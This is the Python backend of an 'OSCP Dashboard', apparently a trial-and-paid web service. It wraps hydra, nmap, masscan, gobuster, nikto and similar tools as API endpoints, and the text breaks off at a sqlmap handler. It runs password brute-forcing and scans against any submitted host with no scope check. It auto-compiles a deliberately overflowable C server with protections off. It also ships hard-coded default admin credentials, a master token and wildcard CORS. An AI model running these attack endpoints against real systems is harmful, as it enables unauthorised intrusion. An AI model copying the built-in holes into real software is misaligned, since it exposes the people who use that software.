# ══════════════════════════════════════════════════════════════
#  OSCP DASHBOARD — COMPLETE BACKEND
#  Run: python3 -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
# ══════════════════════════════════════════════════════════════

from fastapi import FastAPI, Depends, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, List
import subprocess, asyncio, re, json, uuid, datetime, os, hashlib, sqlite3 as _sq
import urllib.request, urllib.parse, ssl as _ssl
import secrets as _sec
from urllib.parse import urlparse

app = FastAPI(title="OSCP Dashboard API")

@app.on_event("startup")
async def _startup():
    """Auto-compile vulnserver on backend start so binary is always ready."""
    import threading
    def _compile():
        try:
            binary = "/tmp/vulnserver"
            if os.path.exists(binary):
                return
            src = binary + ".c"
            VSRC = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
void vuln(char *input) { char buf[500]; strcpy(buf, input); }
int main() {
    int server, client; struct sockaddr_in addr; char input[2000]; int opt=1;
    socklen_t addrlen=sizeof(addr);
    server=socket(AF_INET,SOCK_STREAM,0);
    setsockopt(server,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
    addr.sin_family=AF_INET; addr.sin_addr.s_addr=INADDR_ANY; addr.sin_port=htons(9999);
    bind(server,(struct sockaddr*)&addr,sizeof(addr)); listen(server,5);
    printf("Listening on port 9999\n"); fflush(stdout);
    while(1){
        client=accept(server,(struct sockaddr*)&addr,&addrlen);
        char welcome[]="Welcome to VulnServer\n";
        send(client,welcome,strlen(welcome),0);
        while(1){
            memset(input,0,sizeof(input));
            int n=recv(client,input,sizeof(input)-1,0);
            if(n<=0) break; input[n]=0;
            if(strncmp(input,"OVERFLOW1 ",10)==0){ vuln(input+10); send(client,"OK\n",3,0); }
            else if(strncmp(input,"EXIT",4)==0){ break; }
            else { send(client,"UNKNOWN COMMAND\n",16,0); }
        }
        close(client);
    }
    return 0;
}
"""
            with open(src, "w") as f:
                f.write(VSRC)
            for flags in ["-m32 -fno-stack-protector -z execstack -no-pie",
                          "-fno-stack-protector -z execstack -no-pie"]:
                subprocess.run(["bash", "-c", f"gcc {flags} -o {binary} {src}"],
                               capture_output=True, timeout=30)
                if os.path.exists(binary):
                    print(f"[startup] vulnserver compiled OK → {binary}")
                    return
            print("[startup] vulnserver compile failed — install gcc-multilib")
        except Exception as e:
            print(f"[startup] vulnserver compile error: {e}")
    threading.Thread(target=_compile, daemon=True).start()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security    = HTTPBearer(auto_error=False)
SECRET_TOKEN = os.getenv("OSCP_TOKEN", "cybertoken2026")
ADMIN_USER   = os.getenv("OSCP_USER",  "cyberadmin")
ADMIN_PASS   = os.getenv("OSCP_PASS",  "C@b3rS3cur!ty#2026$X")

# ── API KEYS (set in environment or .env file) ─────────────────
SHODAN_KEY      = os.getenv("SHODAN_KEY", "")
HUNTER_KEY      = os.getenv("HUNTER_KEY", "")
VIRUSTOTAL_KEY  = os.getenv("VIRUSTOTAL_KEY", "")
HIBP_KEY        = os.getenv("HIBP_KEY", "")       # haveibeenpwned.com
SECTRAILS_KEY   = os.getenv("SECTRAILS_KEY", "")  # securitytrails.com

# ── USER DATABASE ─────────────────────────────────────────────
_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.db")
_sessions: dict = {}   # in-memory cache: token → user_id (backed by DB)

def _db():
    c = _sq.connect(_DB); c.row_factory = _sq.Row; return c

def _hash_pw(pw: str) -> str:
    salt = _sec.token_hex(16)
    dk   = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100000)
    return f"{salt}${dk.hex()}"

def _check_pw(pw: str, stored: str) -> bool:
    try:
        salt, dk = stored.split("$", 1)
        return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100000).hex() == dk
    except: return False

def _init_db():
    with _db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS users (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            email         TEXT UNIQUE NOT NULL,
            username      TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            plan          TEXT DEFAULT 'trial',
            trial_expires TEXT,
            scans_today   INTEGER DEFAULT 0,
            last_scan_date TEXT,
            is_admin      INTEGER DEFAULT 0,
            created_at    TEXT DEFAULT CURRENT_TIMESTAMP
        )""")
        c.execute("""CREATE TABLE IF NOT EXISTS sessions (
            token      TEXT PRIMARY KEY,
            user_id    INTEGER NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )""")
        try:
            exp = (datetime.datetime.utcnow() + datetime.timedelta(days=3650)).isoformat()
            c.execute("INSERT OR IGNORE INTO users (email,username,password_hash,plan,trial_expires,is_admin) VALUES (?,?,?,?,?,?)",
                (f"{ADMIN_USER}@oscp.local", ADMIN_USER, _hash_pw(ADMIN_PASS), "enterprise", exp, 1))
        except: pass
_init_db()

def _session_set(tok: str, uid: int):
    _sessions[tok] = uid
    with _db() as c:
        c.execute("INSERT OR REPLACE INTO sessions (token,user_id) VALUES (?,?)", (tok, uid))

def _session_get(tok: str):
    if tok in _sessions:
        return _sessions[tok]
    with _db() as c:
        row = c.execute("SELECT user_id FROM sessions WHERE token=?", (tok,)).fetchone()
    if row:
        _sessions[tok] = row["user_id"]
        return row["user_id"]
    return None

def _session_del(tok: str):
    _sessions.pop(tok, None)
    with _db() as c:
        c.execute("DELETE FROM sessions WHERE token=?", (tok,))

_PLAN_ORDER = ["trial", "pro", "enterprise"]
def _plan_ok(user_plan: str, required: str, is_admin: bool = False) -> bool:
    if is_admin: return True
    try: return _PLAN_ORDER.index(user_plan) >= _PLAN_ORDER.index(required)
    except: return False

def _trial_active(row: dict) -> bool:
    if row.get("plan") != "trial": return True
    exp = row.get("trial_expires")
    if not exp: return False
    return datetime.datetime.utcnow().isoformat() < exp

def _check_limit(user: dict):
    if user.get("id") == 0 or user.get("is_admin") or user.get("plan") in ("pro","enterprise"): return
    if not _trial_active(user):
        raise HTTPException(status_code=403, detail="Trial expired. Please upgrade your plan.")
    today = datetime.date.today().isoformat()
    if user.get("last_scan_date") == today and (user.get("scans_today") or 0) >= 3:
        raise HTTPException(status_code=429, detail="Daily limit reached (3 scans/day on trial). Upgrade to Pro for unlimited scans.")

def _bump_scan(user: dict):
    if user.get("id") == 0 or user.get("plan") in ("pro","enterprise"): return
    today = datetime.date.today().isoformat()
    with _db() as c:
        if user.get("last_scan_date") != today:
            c.execute("UPDATE users SET scans_today=1,last_scan_date=? WHERE id=?", (today, user["id"]))
        else:
            c.execute("UPDATE users SET scans_today=scans_today+1 WHERE id=?", (user["id"],))

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials:
        raise HTTPException(status_code=401, detail="No token provided")
    tok = credentials.credentials
    if tok == SECRET_TOKEN:
        return {"id": 0, "username": ADMIN_USER, "email": f"{ADMIN_USER}@oscp.local",
                "plan": "enterprise", "is_admin": 1, "trial_expires": None, "scans_today": 0}
    uid = _session_get(tok)
    if uid is None:
        raise HTTPException(status_code=401, detail="Invalid or expired token")
    if uid == 0:
        return {"id": 0, "username": ADMIN_USER, "email": f"{ADMIN_USER}@oscp.local",
                "plan": "enterprise", "is_admin": 1, "trial_expires": None, "scans_today": 0}
    with _db() as c:
        row = c.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
    if not row:
        raise HTTPException(status_code=401, detail="User not found")
    return dict(row)

class ScanRequest(BaseModel):
    target: str
    options: Optional[dict] = None

SCAN_HISTORY = []

def save_scan(scan_id, tool, target, result):
    SCAN_HISTORY.append({
        "id": scan_id, "tool": tool, "target": target,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "summary": result.get("output","")[:200]
    })
    if len(SCAN_HISTORY) > 200:
        SCAN_HISTORY.pop(0)

async def run_tool(cmd, timeout=60):
    cmd_str = " ".join(str(c) for c in cmd)
    try:
        proc = await asyncio.create_subprocess_exec(
            *[str(c) for c in cmd],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {"output": out.decode("utf-8", errors="replace"), "cmd": cmd_str}
        except asyncio.TimeoutError:
            try: proc.kill()
            except: pass
            return {"output": f"[Timeout after {timeout}s]", "cmd": cmd_str, "error": "timeout"}
    except Exception as e:
        return {"output": "", "cmd": cmd_str, "error": str(e)}

# ── AUTH ENDPOINTS ────────────────────────────────────────────
class LoginRequest(BaseModel):
    username: str
    password: str

class RegisterRequest(BaseModel):
    email:    str
    username: str
    password: str

@app.post("/api/auth/register")
async def register(req: RegisterRequest):
    if len(req.password) < 6:
        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
    if len(req.username) < 3:
        raise HTTPException(status_code=400, detail="Username must be at least 3 characters")
    if "@" not in req.email:
        raise HTTPException(status_code=400, detail="Invalid email address")
    trial_expires = (datetime.datetime.utcnow() + datetime.timedelta(days=7)).isoformat()
    try:
        with _db() as c:
            c.execute("INSERT INTO users (email,username,password_hash,plan,trial_expires) VALUES (?,?,?,?,?)",
                (req.email.lower().strip(), req.username.strip(), _hash_pw(req.password), "trial", trial_expires))
            uid = c.execute("SELECT id FROM users WHERE email=?", (req.email.lower().strip(),)).fetchone()["id"]
    except _sq.IntegrityError as e:
        msg = str(e)
        if "email" in msg: raise HTTPException(status_code=400, detail="Email already registered")
        raise HTTPException(status_code=400, detail="Username already taken")
    tok = _sec.token_urlsafe(32)
    _session_set(tok, uid)
    return {"access_token": tok, "role": "trial", "username": req.username.strip(),
            "plan": "trial", "trial_expires": trial_expires, "message": "Account created — 7-day free trial started"}

@app.post("/api/auth/login")
async def login(req: LoginRequest):
    if req.username == ADMIN_USER and req.password == ADMIN_PASS:
        tok = _sec.token_urlsafe(32)
        _session_set(tok, 0)
        return {"access_token": tok, "role": "admin", "username": ADMIN_USER,
                "plan": "enterprise", "is_admin": True}
    with _db() as c:
        row = c.execute("SELECT * FROM users WHERE username=? OR email=?",
                        (req.username, req.username.lower())).fetchone()
    if not row or not _check_pw(req.password, row["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid username or password")
    user = dict(row)
    tok = _sec.token_urlsafe(32)
    _session_set(tok, user["id"])
    plan = user["plan"]
    if plan == "trial" and not _trial_active(user):
        plan = "expired"
    return {"access_token": tok, "role": "admin" if user["is_admin"] else plan,
            "username": user["username"], "plan": plan, "is_admin": bool(user["is_admin"]),
            "trial_expires": user.get("trial_expires"), "scans_today": user.get("scans_today",0)}

@app.get("/api/auth/me")
async def get_me(user=Depends(verify_token)):
    plan = user["plan"]
    if plan == "trial" and not _trial_active(user):
        plan = "expired"
    trial_days = None
    if user.get("trial_expires"):
        try:
            exp = datetime.datetime.fromisoformat(user["trial_expires"])
            trial_days = max(0, (exp - datetime.datetime.utcnow()).days)
        except: pass
    return {"id": user["id"], "username": user["username"],
            "email": user.get("email",""), "plan": plan,
            "is_admin": bool(user.get("is_admin")), "trial_days_left": trial_days,
            "scans_today": user.get("scans_today",0)}

@app.post("/api/auth/logout")
async def logout(credentials: HTTPAuthorizationCredentials = Depends(security), user=Depends(verify_token)):
    if credentials:
        _session_del(credentials.credentials)
    return {"message": "Logged out"}

# ── ADMIN ENDPOINTS ───────────────────────────────────────────
@app.get("/api/admin/users")
async def admin_users(user=Depends(verify_token)):
    if not user.get("is_admin"):
        raise HTTPException(status_code=403, detail="Admin only")
    with _db() as c:
        rows = c.execute("SELECT id,email,username,plan,trial_expires,scans_today,last_scan_date,is_admin,created_at FROM users ORDER BY id DESC").fetchall()
    return {"users": [dict(r) for r in rows]}

@app.post("/api/admin/update_plan")
async def admin_update_plan(req: dict, user=Depends(verify_token)):
    if not user.get("is_admin"):
        raise HTTPException(status_code=403, detail="Admin only")
    uid  = req.get("user_id")
    plan = req.get("plan")
    if plan not in ("trial","pro","enterprise"):
        raise HTTPException(status_code=400, detail="Invalid plan")
    exp = None
    if plan == "trial":
        exp = (datetime.datetime.utcnow() + datetime.timedelta(days=7)).isoformat()
    with _db() as c:
        c.execute("UPDATE users SET plan=?,trial_expires=? WHERE id=?", (plan, exp, uid))
    return {"message": f"User {uid} updated to {plan}"}

@app.delete("/api/admin/delete_user/{uid}")
async def admin_delete_user(uid: int, user=Depends(verify_token)):
    if not user.get("is_admin"):
        raise HTTPException(status_code=403, detail="Admin only")
    with _db() as c:
        c.execute("DELETE FROM users WHERE id=?", (uid,))
    return {"message": f"User {uid} deleted"}

_TOOLS = {
    "nmap":           "/usr/bin/nmap",
    "nikto":          "/usr/bin/nikto",
    "sqlmap":         "/usr/bin/sqlmap",
    "hydra":          "/usr/bin/hydra",
    "gobuster":       "/usr/bin/gobuster",
    "ffuf":           "/usr/bin/ffuf",
    "whatweb":        "/usr/bin/whatweb",
    "wpscan":         "/usr/bin/wpscan",
    "masscan":        "/usr/bin/masscan",
    "dnsrecon":       "/usr/bin/dnsrecon",
    "sublist3r":      "/usr/bin/sublist3r",
    "aircrack-ng":    "/usr/bin/aircrack-ng",
    "wifite":         "/usr/bin/wifite",
    "recon-ng":       "/usr/bin/recon-ng",
    "tcpdump":        "/usr/bin/tcpdump",
    "wafw00f":        "/usr/bin/wafw00f",
    "commix":         "/usr/bin/commix",
    "john":           "/usr/sbin/john",
    "hashcat":        "/usr/bin/hashcat",
    "crackmapexec":   "/usr/bin/crackmapexec",
    "socat":          "/usr/bin/socat",
    "proxychains4":   "/usr/bin/proxychains4",
    "apktool":        "/usr/bin/apktool",
    "yara":           "/usr/bin/yara",
    "metasploit":     "/usr/bin/msfconsole",
    "msfvenom":       "/usr/bin/msfvenom",
    "setoolkit":      "/usr/bin/setoolkit",
    "nuclei":         "/usr/local/bin/nuclei",
    "arjun":          "/usr/bin/arjun",
    "zaproxy":        "/usr/bin/zaproxy",
    "wireshark":      "/usr/bin/wireshark",
    "beef-xss":       "/usr/bin/beef-xss",
    "dirb":           "/usr/bin/dirb",
    "curl":           "/usr/bin/curl",
    "wget":           "/usr/bin/wget",
    "git":            "/usr/bin/git",
    "python3":        "/usr/bin/python3",
}

@app.get("/api/health")
async def health():
    try:
        with _db() as c:
            user_count = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    except: user_count = 0
    free_tools = {}
    for name, path in _TOOLS.items():
        exists = os.path.isfile(path)
        if not exists:
            alt = subprocess.run(["which", name], capture_output=True, text=True).stdout.strip()
            exists = bool(alt)
            path = alt or path
        free_tools[name] = {"available": exists, "path": path if exists else ""}
    return {
        "status": "ok",
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "version": "3.1",
        "users": user_count,
        "free_tools": free_tools
    }

@app.get("/api/history")
async def get_history(user=Depends(verify_token)):
    return {"history": list(reversed(SCAN_HISTORY))}

@app.get("/api/osint/api_keys_status")
async def api_keys_status(user=Depends(verify_token)):
    """Return which API keys are configured (masked)."""
    def mask(k): return "✅ Configured" if k else "❌ Not set"
    return {
        "shodan":        {"status": mask(SHODAN_KEY),     "url": "https://account.shodan.io/"},
        "hunter":        {"status": mask(HUNTER_KEY),     "url": "https://hunter.io/api-keys"},
        "virustotal":    {"status": mask(VIRUSTOTAL_KEY), "url": "https://www.virustotal.com/gui/my-apikey"},
        "hibp":          {"status": mask(HIBP_KEY),       "url": "https://haveibeenpwned.com/API/Key"},
        "securitytrails":{"status": mask(SECTRAILS_KEY),  "url": "https://securitytrails.com/app/account/credentials"},
    }

class ApiKeysRequest(BaseModel):
    shodan: Optional[str] = ""
    hunter: Optional[str] = ""
    virustotal: Optional[str] = ""
    hibp: Optional[str] = ""
    securitytrails: Optional[str] = ""

@app.post("/api/osint/save_api_keys")
async def save_api_keys(req: ApiKeysRequest, user=Depends(verify_token)):
    """Save API keys to .env file and update runtime globals."""
    global SHODAN_KEY, HUNTER_KEY, VIRUSTOTAL_KEY, HIBP_KEY, SECTRAILS_KEY
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    lines = []
    if os.path.exists(env_path):
        with open(env_path) as f:
            lines = [l for l in f.read().splitlines()
                     if not any(l.startswith(k) for k in
                                ["SHODAN_KEY","HUNTER_KEY","VIRUSTOTAL_KEY","HIBP_KEY","SECTRAILS_KEY"])]
    if req.shodan:        lines.append(f"SHODAN_KEY={req.shodan}");       SHODAN_KEY = req.shodan
    if req.hunter:        lines.append(f"HUNTER_KEY={req.hunter}");       HUNTER_KEY = req.hunter
    if req.virustotal:    lines.append(f"VIRUSTOTAL_KEY={req.virustotal}"); VIRUSTOTAL_KEY = req.virustotal
    if req.hibp:          lines.append(f"HIBP_KEY={req.hibp}");           HIBP_KEY = req.hibp
    if req.securitytrails: lines.append(f"SECTRAILS_KEY={req.securitytrails}"); SECTRAILS_KEY = req.securitytrails
    with open(env_path, "w") as f:
        f.write("\n".join(lines) + "\n")
    return {"message": "API keys saved — active immediately, will persist on next restart."}


# ── PASSWORD ATTACKS — HYDRA ──────────────────────────────────
class HydraRequest(BaseModel):
    target:   str
    service:  str = "http-post-form"
    username: str = ""
    userlist: str = ""
    passlist: str = "/usr/share/wordlists/rockyou.txt"
    port:     str = ""
    extra:    str = ""

@app.post("/api/password/hydra")
async def password_hydra(req: HydraRequest, user=Depends(verify_token)):
    cmd = ["hydra"]
    if req.username:
        cmd += ["-l", req.username]
    elif req.userlist:
        cmd += ["-L", req.userlist]
    else:
        cmd += ["-l", "admin"]
    cmd += ["-P", req.passlist]
    if req.port:
        cmd += ["-s", req.port]
    cmd += ["-t", "4", "-f", "-V"]
    if req.extra:
        cmd += req.extra.split()
    parsed = urlparse(req.target if req.target.startswith("http") else "http://"+req.target)
    host = parsed.hostname or req.target
    cmd += [host, req.service]
    result = await run_tool(cmd, timeout=300)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        if "[" in line and "] login:" in line.lower():
            found.append(line.strip())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "hydra", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "service": req.service,
        "credentials_found": found, "total": len(found),
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  RECON MODULE
# ══════════════════════════════════════════════════════════════

def _recon_host(target: str) -> str:
    t = target.strip()
    if t.startswith("http://") or t.startswith("https://"):
        return urlparse(t).hostname or t
    return t.split("/")[0].strip()

extract_host = _recon_host

@app.post("/api/recon/whois")
async def recon_whois(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["whois", host], timeout=30)
    out = result.get("output","")
    def _get(patterns, text):
        for p in patterns:
            m = re.search(p, text, re.IGNORECASE | re.MULTILINE)
            if m: return m.group(1).strip()
        return None
    registrar   = _get([r"Registrar:\s*(.+)", r"registrar:\s*(.+)"], out)
    created     = _get([r"Creation Date:\s*(.+)", r"Created:\s*(.+)", r"created:\s*(.+)"], out)
    expires     = _get([r"Expiry Date:\s*(.+)", r"Registry Expiry Date:\s*(.+)", r"expires:\s*(.+)"], out)
    updated     = _get([r"Updated Date:\s*(.+)", r"last-modified:\s*(.+)"], out)
    registrant  = _get([r"Registrant Name:\s*(.+)", r"Registrant Organization:\s*(.+)"], out)
    country     = _get([r"Registrant Country:\s*(.+)", r"country:\s*(.+)"], out)
    name_servers = re.findall(r"Name Server:\s*(.+)", out, re.IGNORECASE)
    name_servers = [ns.strip().lower() for ns in name_servers[:6]]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "whois", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "whois",
        "registrar": registrar, "created": created, "expires": expires,
        "updated": updated, "registrant": registrant, "country": country,
        "name_servers": name_servers, "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/nmap")
async def recon_nmap(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "-sC", "-T4", "--open", "-p-", host], timeout=300)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+(\w+)\s+(.+)", line.strip())
        if m:
            port, proto, state, service = m.groups()
            parts = service.split(None, 1)
            svc_name = parts[0] if parts else service
            version  = parts[1] if len(parts)>1 else ""
            ports.append({"port":int(port),"proto":proto,"state":state,"service":svc_name,"version":version.strip()})
    banner = None
    bm = re.search(r"\|[_ ]\s*banner:\s*(.+)", out, re.IGNORECASE)
    if bm: banner = bm.group(1).strip()
    os_guess = None
    om = re.search(r"OS details?:\s*(.+)", out, re.IGNORECASE)
    if om: os_guess = om.group(1).strip()
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "nmap", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "nmap",
        "ports": ports, "total_open": len(ports),
        "banner": banner, "os_guess": os_guess,
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/masscan")
async def recon_masscan(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["masscan", host, "-p1-65535", "--rate=1000", "--wait=2"], timeout=120)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.search(r"Discovered open port (\d+)/(\w+) on (.+)", line)
        if m:
            ports.append({"port":int(m.group(1)),"proto":m.group(2),"host":m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "masscan", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "masscan",
        "ports": sorted(ports, key=lambda x:x["port"]),
        "total_open": len(ports), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dns")
async def recon_dns(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output","")
    records = []
    for line in out.splitlines():
        line = line.strip()
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME","PTR","SRV"]:
            pattern = rf"\[\*\]\s+{rtype}\s+(.+)"
            m = re.match(pattern, line, re.IGNORECASE)
            if m:
                records.append({"type":rtype,"value":m.group(1).strip()})
                break
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dnsrecon",
        "records": records, "total": len(records), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sublist3r", "-d", host, "-t", "5", "-o", "/dev/null"], timeout=120)
    out = result.get("output","")
    subdomains = []
    for line in out.splitlines():
        line = line.strip()
        if line and host in line and not line.startswith("[") and not line.startswith("-"):
            subdomains.append(line)
    subdomains = list(dict.fromkeys(subdomains))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sublist3r", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "sublist3r",
        "subdomains": subdomains, "total": len(subdomains), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/theharvester")
async def recon_theharvester(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["theHarvester", "-d", host, "-b", "bing,crtsh,dnsdumpster", "-l", "100"], timeout=120)
    out = result.get("output","")
    emails = list(dict.fromkeys(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    hosts  = list(dict.fromkeys(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", out)))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "theharvester", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "theHarvester",
        "emails": emails, "hosts": hosts,
        "total_emails": len(emails), "total_hosts": len(hosts),
        "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dirb")
async def recon_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb", req.target, "/usr/share/wordlists/dirb/common.txt", "-S", "-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dirb", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dirb",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/gobuster")
async def recon_gobuster(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(
        ["gobuster", "dir", "-u", req.target, "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "20", "-q", "--no-progress"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m: found.append({"path": m.group(1), "status": int(m.group(2))})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "gobuster", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "gobuster",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  VULNERABILITY SCANNING MODULE
# ══════════════════════════════════════════════════════════════

import urllib.request as _ureq, ssl as _ssl

def _sev(text):
    t = text.lower()
    if any(k in t for k in ["sql injection","remote code","command injection","rce","shell","arbitrary file","traversal","authentication bypass"]): return "CRITICAL"
    if any(k in t for k in ["xss","cross-site script","csrf","open redirect","admin","backup","config","password","credentials","privilege"]): return "HIGH"
    if any(k in t for k in ["header missing","content-security","x-frame","referrer","hsts","strict-transport","deprecated","information disclosure","version"]): return "MEDIUM"
    if any(k in t for k in ["clickjack","cookie","cache","options","banner","server","mime"]): return "LOW"
    return "MEDIUM"

def _rem(text):
    t = text.lower()
    if "content-security-policy" in t: return "Add Content-Security-Policy header"
    if "strict-transport" in t or "hsts" in t: return "Enable HSTS: Strict-Transport-Security header"
    if "referrer-policy" in t: return "Add Referrer-Policy header"
    if "x-content-type" in t: return "Add X-Content-Type-Options: nosniff header"
    if "x-frame" in t: return "Use Content-Security-Policy frame-ancestors instead of X-Frame-Options"
    if "permissions-policy" in t: return "Add Permissions-Policy header"
    if "sql" in t: return "Use parameterised queries / prepared statements"
    if "xss" in t: return "Sanitise and encode all user input; enforce CSP"
    if "csrf" in t: return "Implement CSRF tokens on all state-changing requests"
    if "admin" in t: return "Restrict admin paths by IP or require strong authentication"
    if "backup" in t or "config" in t: return "Remove backup/config files from web root"
    if "cookie" in t: return "Set Secure, HttpOnly, SameSite flags on cookies"
    return "Review and remediate according to OWASP guidelines"


@app.post("/api/scan/nikto")
async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["nikto", "-h", req.target, "-nointeractive", "-timeout", "10", "-maxtime", "180s"], timeout=220)
    out = result.get("output","")
    findings = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("+ "): continue
        if any(s in line for s in ["Target IP","Target Hostname","Target Port","Start Time","End Time","host(s) tested","Nikto v","requests:","No CGI Directories"]): continue
        detail = re.sub(r"^\+\s*\[\d+\]\s*","",line).strip().lstrip("+ ").strip()
        detail = re.sub(r"\s*See:\s*https?://\S+","",detail,flags=re.IGNORECASE).strip()
        if not detail or len(detail)<10: continue
        findings.append({"detail":detail,"severity":_sev(detail),"cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Web Vulnerability","owasp":"A05:2021","remediation":_rem(detail)})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nikto",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nikto","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nmap_vuln")
async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap","--script","vuln","-T4",host], timeout=180)
    out = result.get("output","")
    findings = []
    current = None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"\|\s*(CVE-[\d-]+).*?([\d.]+)\s*(.+)?", line)
        if m:
            cve,cvss,desc = m.group(1),m.group(2),(m.group(3) or "").strip()
            sev = "CRITICAL" if float(cvss)>=9 else "HIGH" if float(cvss)>=7 else "MEDIUM" if float(cvss)>=4 else "LOW"
            findings.append({"detail":f"{cve}: {desc}" if desc else cve,"severity":sev,"cvss":cvss,"cve":cve,"cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Apply vendor patch for "+cve})
        elif "|_" in line and "VULNERABLE" in line.upper():
            findings.append({"detail":line.replace("|_","").strip(),"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Patch the vulnerable service"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nmap_vuln",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap_vuln","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/sqlmap")
async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
